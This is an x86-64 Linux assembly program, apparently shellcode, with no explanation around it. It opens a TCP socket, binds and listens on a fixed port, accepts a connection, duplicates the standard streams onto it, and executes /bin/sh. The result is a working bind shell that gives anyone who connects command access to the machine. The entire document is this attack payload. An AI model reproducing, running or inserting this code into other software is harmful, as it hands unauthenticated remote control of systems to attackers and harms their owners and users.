section .text
    global _start

_start:
    xor rax, rax
    xor rdx, rdx
    xor rsi, rsi
    inc esi
    push QWORD 0x29
    pop rax
    push QWORD 0x2
    pop rdi
    syscall ;rdi = 0x2, rsi = 0x1, rdx = 0x0
    xchg rax, rdi
    push QWORD 0x2
    mov word [rsp+0x2], 0xe015
    push rsp
    pop rsi
    push rdx
    push QWORD 0x31
    pop rax
    push QWORD 0x10
    pop rdx
    syscall
    pop rsi
    push QWORD 0x32
    pop rax
    syscall
    push QWORD 0x2b
    pop rax
    syscall
    xchg rax, rdi
    push QWORD 0x3
    pop rsi
loop:
    dec esi
    mov al, 0x21
    syscall
    jne loop
    mul esi
    push rdx
    mov QWORD rbx, 0x68732f2f6e69622f
    push rbx
    lea rdi, [rsp]
    mov al, 0x3b
    syscall
